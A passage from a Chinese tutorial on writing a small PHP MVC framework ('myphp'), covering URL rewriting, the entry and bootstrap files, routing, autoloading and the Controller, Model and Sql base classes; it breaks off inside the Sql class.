<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line"></span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # 确保请求路径不是一个文件名或目录</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line"></span><br><span class="line">    # 重定向所有请求到 index.php?url=PATHNAME</span><br><span class="line"></span><br><span class="line">    RewriteRule ^(.*)$ index.php?url=$1 [PT,L]</span><br><span class="line"></span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<p>这样做的主要原因有：</p>
<ul>
<li>程序有一个单一的入口；</li>
<li>除静态程序，其他所有程序都重定向到 index.php 上；</li>
<li>可以用来生成利于SEO的URL，想要更好的配置URL，后期可能会需要URL路由，这里先不做介绍了。</li>
</ul>
<h4><span id="htaccess创建方法">.htaccess创建方法</span></h4><p>按组合键windows+R 打开运行，然后输入命名CMD，然后在输入copy con .htaccess 回车 （不会看到变化），然后再按ctrl+Z键，再回车，然后就创建了</p>
<h3><span id="入口文件">入口文件</span></h3><p>在 myphp-frame目录下添加 index.php 文件，文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// 应用目录为当前目录</span><br><span class="line">define(&apos;APP_PATH&apos;, __DIR__.&apos;/&apos;);</span><br><span class="line">// 开启调试模式</span><br><span class="line">define(&apos;APP_DEBUG&apos;, true);</span><br><span class="line">// 网站根URL</span><br><span class="line">define(&apos;APP_URL&apos;, &apos;http://localhost/myphp&apos;);</span><br><span class="line">// 加载框架</span><br><span class="line">require &apos;./myphp/MyPHP.php&apos;;</span><br></pre></td></tr></table></figure>
<p>注意，上面的PHP代码中，并没有添加PHP结束符号”?&gt;”，这么做的主要原因是，对于只有 PHP 代码的文件，结束标志(“?&gt;”)最好不存在，PHP自身并不需要结束符号，不添加结束符号可以很大程度上防止末尾被添加额外的注入内容，让程序更加安全。</p>
<h3><span id="配置文件和主请求">配置文件和主请求</span></h3><p>在 index.php 中，我们对 myphp  文件夹下的 MyPHP.php 发起了请求，那么 MyPHP.php 这个启动文件中到底会包含哪些内容呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 应用目录为当前目录</span><br><span class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</span><br><span class="line"></span><br><span class="line">// 开启调试模式</span><br><span class="line">define(&apos;APP_DEBUG&apos;, true);</span><br><span class="line"></span><br><span class="line">// 加载框架文件</span><br><span class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</span><br><span class="line"></span><br><span class="line">// 加载配置文件</span><br><span class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</span><br><span class="line"></span><br><span class="line">// 实例化框架类</span><br><span class="line">(new Myphp($config))-&gt;run();</span><br></pre></td></tr></table></figure>
<p>以上文件都其实可以直接在 index.php 文件中包含，常量也可以直接在 index.php 中定义，我们这么做的原因是为了在后期管理和拓展中更加的方便，所以把需要在一开始的时候就加载运行的程序统一放到一个单独的文件中引用。</p>
<p>先来看看config文件下的 config .php 文件，该文件的主要作用是设置一些程序的配置项及数据库连接等，主要内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 应用目录为当前目录</span><br><span class="line">define(&apos;APP_PATH&apos;, __DIR__ . &apos;/&apos;);</span><br><span class="line"></span><br><span class="line">// 开启调试模式</span><br><span class="line">define(&apos;APP_DEBUG&apos;, true);</span><br><span class="line"></span><br><span class="line">// 加载框架文件</span><br><span class="line">require(APP_PATH . &apos;myphp/Myphp.php&apos;);</span><br><span class="line"></span><br><span class="line">// 加载配置文件</span><br><span class="line">$config = require(APP_PATH . &apos;config/config.php&apos;);</span><br><span class="line"></span><br><span class="line">// 实例化框架类</span><br><span class="line">(new Myphp($config))-&gt;run();</span><br></pre></td></tr></table></figure>
<p>应该说 config.php 涉及到的内容并不多，不过是一些基础数据库的设置，再来看看 myphp下的共用框架入口文件 MyPHP.php 应该怎么写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * myphp框架核心</span><br><span class="line"> */</span><br><span class="line">class Myphp</span><br><span class="line">&#123;</span><br><span class="line">    protected $config = [];</span><br><span class="line"></span><br><span class="line">    public function __construct($config)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;config = $config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 运行程序</span><br><span class="line">    public function run()</span><br><span class="line">    &#123;</span><br><span class="line">        spl_autoload_register(array($this, &apos;loadClass&apos;));</span><br><span class="line">        $this-&gt;setReporting();</span><br><span class="line">        $this-&gt;removeMagicQuotes();</span><br><span class="line">        $this-&gt;unregisterGlobals();</span><br><span class="line">        $this-&gt;setDbConfig();</span><br><span class="line">        $this-&gt;route();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 路由处理</span><br><span class="line">    public function route()</span><br><span class="line">    &#123;</span><br><span class="line">        $controllerName = $this-&gt;config[&apos;defaultController&apos;];</span><br><span class="line">        $actionName = $this-&gt;config[&apos;defaultAction&apos;];</span><br><span class="line">        $param = array();</span><br><span class="line"></span><br><span class="line">        $url = $_SERVER[&apos;REQUEST_URI&apos;];</span><br><span class="line">        // 清除?之后的内容</span><br><span class="line">        $position = strpos($url, &apos;?&apos;);</span><br><span class="line">        $url = $position === false ? $url : substr($url, 0, $position);</span><br><span class="line">        // 删除前后的“/”</span><br><span class="line">        $url = trim($url, &apos;/&apos;);</span><br><span class="line"></span><br><span class="line">        if ($url) &#123;</span><br><span class="line">            // 使用“/”分割字符串，并保存在数组中</span><br><span class="line">            $urlArray = explode(&apos;/&apos;, $url);</span><br><span class="line">            // 删除空的数组元素</span><br><span class="line">            $urlArray = array_filter($urlArray);</span><br><span class="line">            </span><br><span class="line">            // 获取控制器名</span><br><span class="line">            $controllerName = ucfirst($urlArray[0]);</span><br><span class="line">            </span><br><span class="line">            // 获取动作名</span><br><span class="line">            array_shift($urlArray);</span><br><span class="line">            $actionName = $urlArray ? $urlArray[0] : $actionName;</span><br><span class="line">            </span><br><span class="line">            // 获取URL参数</span><br><span class="line">            array_shift($urlArray);</span><br><span class="line">            $param = $urlArray ? $urlArray : array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 判断控制器和操作是否存在</span><br><span class="line">        $controller = $controllerName . &apos;Controller&apos;;</span><br><span class="line">        if (!class_exists($controller)) &#123;</span><br><span class="line">            exit($controller . &apos;控制器不存在&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!method_exists($controller, $actionName)) &#123;</span><br><span class="line">            exit($actionName . &apos;方法不存在&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 如果控制器和操作名存在，则实例化控制器，因为控制器对象里面</span><br><span class="line">        // 还会用到控制器名和操作名，所以实例化的时候把他们俩的名称也</span><br><span class="line">        // 传进去。结合Controller基类一起看</span><br><span class="line">        $dispatch = new $controller($controllerName, $actionName);</span><br><span class="line"></span><br><span class="line">        // $dispatch保存控制器实例化后的对象，我们就可以调用它的方法，</span><br><span class="line">        // 也可以像方法中传入参数，以下等同于：$dispatch-&gt;$actionName($param)</span><br><span class="line">        call_user_func_array(array($dispatch, $actionName), $param);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检测开发环境</span><br><span class="line">    public function setReporting()</span><br><span class="line">    &#123;</span><br><span class="line">        if (APP_DEBUG === true) &#123;</span><br><span class="line">            error_reporting(E_ALL);</span><br><span class="line">            ini_set(&apos;display_errors&apos;,&apos;On&apos;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            error_reporting(E_ALL);</span><br><span class="line">            ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</span><br><span class="line">            ini_set(&apos;log_errors&apos;, &apos;On&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 删除敏感字符</span><br><span class="line">    public function stripSlashesDeep($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = is_array($value) ? array_map(array($this, &apos;stripSlashesDeep&apos;), $value) : stripslashes($value);</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检测敏感字符并删除</span><br><span class="line">    public function removeMagicQuotes()</span><br><span class="line">    &#123;</span><br><span class="line">        if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">            $_GET = isset($_GET) ? $this-&gt;stripSlashesDeep($_GET ) : &apos;&apos;;</span><br><span class="line">            $_POST = isset($_POST) ? $this-&gt;stripSlashesDeep($_POST ) : &apos;&apos;;</span><br><span class="line">            $_COOKIE = isset($_COOKIE) ? $this-&gt;stripSlashesDeep($_COOKIE) : &apos;&apos;;</span><br><span class="line">            $_SESSION = isset($_SESSION) ? $this-&gt;stripSlashesDeep($_SESSION) : &apos;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 检测自定义全局变量并移除。因为 register_globals 已经弃用，如果</span><br><span class="line">    // 已经弃用的 register_globals 指令被设置为 on，那么局部变量也将</span><br><span class="line">    // 在脚本的全局作用域中可用。 例如， $_POST[&apos;foo&apos;] 也将以 $foo 的</span><br><span class="line">    // 形式存在，这样写是不好的实现，会影响代码中的其他变量。 相关信息，</span><br><span class="line">    // 参考: http://php.net/manual/zh/faq.using.php#faq.register-globals</span><br><span class="line">    public function unregisterGlobals()</span><br><span class="line">    &#123;</span><br><span class="line">        if (ini_get(&apos;register_globals&apos;)) &#123;</span><br><span class="line">            $array = array(&apos;_SESSION&apos;, &apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;, &apos;_REQUEST&apos;, &apos;_SERVER&apos;, &apos;_ENV&apos;, &apos;_FILES&apos;);</span><br><span class="line">            foreach ($array as $value) &#123;</span><br><span class="line">                foreach ($GLOBALS[$value] as $key =&gt; $var) &#123;</span><br><span class="line">                    if ($var === $GLOBALS[$key]) &#123;</span><br><span class="line">                        unset($GLOBALS[$key]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 配置数据库信息</span><br><span class="line">    public function setDbConfig()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;config[&apos;db&apos;]) &#123;</span><br><span class="line">            define(&apos;DB_HOST&apos;, $this-&gt;config[&apos;db&apos;][&apos;host&apos;]);</span><br><span class="line">            define(&apos;DB_NAME&apos;, $this-&gt;config[&apos;db&apos;][&apos;dbname&apos;]);</span><br><span class="line">            define(&apos;DB_USER&apos;, $this-&gt;config[&apos;db&apos;][&apos;username&apos;]);</span><br><span class="line">            define(&apos;DB_PASS&apos;, $this-&gt;config[&apos;db&apos;][&apos;password&apos;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 自动加载控制器和模型类 </span><br><span class="line">    public static function loadClass($class)</span><br><span class="line">    &#123;</span><br><span class="line">        $frameworks = __DIR__ . &apos;/&apos; . $class . &apos;.php&apos;;</span><br><span class="line">        $controllers = APP_PATH . &apos;application/controllers/&apos; . $class . &apos;.php&apos;;</span><br><span class="line">        $models = APP_PATH . &apos;application/models/&apos; . $class . &apos;.php&apos;;</span><br><span class="line"></span><br><span class="line">        if (file_exists($frameworks)) &#123;</span><br><span class="line">            // 加载框架核心类</span><br><span class="line">            include $frameworks;</span><br><span class="line">        &#125; elseif (file_exists($controllers)) &#123;</span><br><span class="line">            // 加载应用控制器类</span><br><span class="line">            include $controllers;</span><br><span class="line">        &#125; elseif (file_exists($models)) &#123;</span><br><span class="line">            //加载应用模型类</span><br><span class="line">            include $models;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 错误代码</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主请求方法 route()，首先我们想看看我们的 URL 会这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yoursite.com/controllerName/actionName/queryString</span><br></pre></td></tr></table></figure>
<p>route()的作用就是，从全局变量 \$_GET[‘url’]变量中获取 URL，并将其分割成三部分：\$controller、\$action 和 $queryString。</p>
<p>例如，URL链接为：myphp.com/item/view/1/first-item，那么</p>
<ul>
<li>$controller 就是：item</li>
<li>$action 就是：view</li>
<li>查询字符串Query String就是：array(1, first-item)</li>
</ul>
<p>分割完成后，会实例化一个新的控制器：$controller.’Controller’（其中“.”是连字符），并调用其方法 $action。</p>
<h3><span id="控制器controller基类">控制器/Controller基类</span></h3><p>接下来的操作就是在 myphp 中建立程序所需的基类，包括控制器、模型和视图的基类。</p>
<p>新建控制器基类为 Controller.php，控制器的主要功能就是总调度，具体具体内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">/**</span><br><span class="line"> * 控制器基类</span><br><span class="line"> */</span><br><span class="line">class Controller</span><br><span class="line">&#123;</span><br><span class="line">    protected $_controller;</span><br><span class="line">    protected $_action;</span><br><span class="line">    protected $_view;</span><br><span class="line"> </span><br><span class="line">    // 构造函数，初始化属性，并实例化对应模型</span><br><span class="line">    public function __construct($controller, $action)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_controller = $controller;</span><br><span class="line">        $this-&gt;_action = $action;</span><br><span class="line">        $this-&gt;_view = new View($controller, $action);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 分配变量</span><br><span class="line">    public function assign($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_view-&gt;assign($name, $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 渲染视图</span><br><span class="line">    public function render()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_view-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Controller 类实现所有控制器、模型和视图（View类）的通信。在执行析构函数时，我们可以调用 render() 来显示视图（view）文件。</p>
<h3><span id="模型model基类">模型Model基类</span></h3><p>新建模型基类为 Model.php，模型基类 Model.php 代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Model extends Sql</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        // 获取数据库表名</span><br><span class="line">        if (!$this-&gt;table) &#123;</span><br><span class="line"></span><br><span class="line">            // 获取模型类名称</span><br><span class="line">            $this-&gt;model = get_class($this);</span><br><span class="line"></span><br><span class="line">            // 删除类名最后的 Model 字符</span><br><span class="line">            $this-&gt;model = substr($this-&gt;model, 0, -5);</span><br><span class="line"></span><br><span class="line">            // 数据库表名与类名一致</span><br><span class="line">            $this-&gt;table = strtolower($this-&gt;model);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑到模型需要对数据库进行处理，所以单独建立一个数据库基类 Sql.class.php，模型基类继承 Sql.php，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class Sql</span><br><span class="line">&#123;</span><br><span class="line">    // 数据库表名</span><br><span class="line">    protected $table;</span><br><span class="line"></span><br><span class="line">    // 数据库主键</span><br><span class="line">    protected $primary = &apos;id&apos;;</span><br><span class="line"></span><br><span class="line">    // WHERE和ORDER拼装后的条件</span><br><span class="line">    private $filter = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    // Pdo bindParam()绑定的参数集合</span><br><span class="line">    private $param = array();</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 查询条件拼接，使用方式：</span><br><span class="line">     *</span><br><span class="line">     * $this-&gt;where([&apos;id = 1&apos;,&apos;and title=&quot;Web&quot;&apos;, ...])-&gt;fetch();</span><br><span class="line">     * 为防止注入，建议通过$param方式传入参数：</span><br><span class="line">     * $this-&gt;where([&apos;id = :id&apos;], [&apos;:id&apos; =&gt; $id])-&gt;fetch();</span><br><span class="line">     *</span><br><span class="line">     * @param array $where 条件</span><br><span class="line">     * @return $this 当前对象</span><br><span class="line">     */</span><br><span class="line">    public function where($where = array(), $param = array())</span><br><span class="line">    &#123;</span><br><span class="line">        if ($where) &#123;</span><br><span class="line">            $this-&gt;filter .= &apos; WHERE &apos;;</span><br><span class="line">            $this-&gt;filter .= implode(&apos; &apos;, $where);</span><br><span class="line"></span><br><span class="line">            $this-&gt;param = $param;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 拼装排序条件，使用方式：</span><br><span class="line">     *</span><br><span class="line">     * $this-&gt;order([&apos;id DESC&apos;, &apos;title ASC&apos;, ...])-&gt;fetch();</span><br><span class="line">     *</span><br><span class="line">     * @param array $order 排序条件</span><br><span class="line">     * @return $this</span><br><span class="line">     */</span><br><span class="line">    public function order($order = array())</span><br><span class="line">    &#123;</span><br><span class="line">        if($order) &#123;</span><br><span class="line">            $this-&gt;filter .= &apos; ORDER BY &apos;;</span><br><span class="line">            $this-&gt;filter .= implode(&apos;,&apos;, $order);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查询所有</span><br><span class="line">    public function fetchAll()</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;fetchAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查询一条</span><br><span class="line">    public function fetch()</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = sprintf(&quot;select * from `%s` %s&quot;, $this-&gt;table, $this-&gt;filter);</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 根据条件 (id) 删除</span><br><span class="line">    public function delete($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = sprintf(&quot;delete from `%s` where `%s` = :%s&quot;, $this-&gt;table, $this-&gt;primary, $this-&gt;primary);</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, [$this-&gt;primary =&gt; $id]);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;rowCount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 新增数据</span><br><span class="line">    public function add($data)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql = sprintf(&quot;insert into `%s` %s&quot;, $this-&gt;table, $this-&gt;formatInsert($data));</span><br><span class="line">        $sth = Db::pdo()-&gt;prepare($sql);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $data);</span><br><span class="line">        $sth = $this-&gt;formatParam($sth, $this-&gt;param);</span><br><span class="line">        $sth-&gt;execute();</span><br><span class="line"></span><br><span class="line">        return $sth-&gt;rowCount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 